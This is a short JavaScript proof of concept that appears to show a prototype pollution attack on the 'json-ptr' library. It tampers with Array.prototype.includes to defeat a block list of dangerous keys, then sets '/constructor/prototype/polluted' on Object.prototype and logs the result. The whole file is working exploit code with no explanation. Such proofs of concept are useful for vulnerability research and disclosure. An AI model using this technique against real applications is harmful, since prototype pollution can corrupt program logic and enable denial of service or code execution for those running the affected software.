Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const {JsonPointer} = require('json-ptr');
JsonPointer.set({}, '/constructor/prototype/polluted', 'yes', true);
console.log({}.polluted);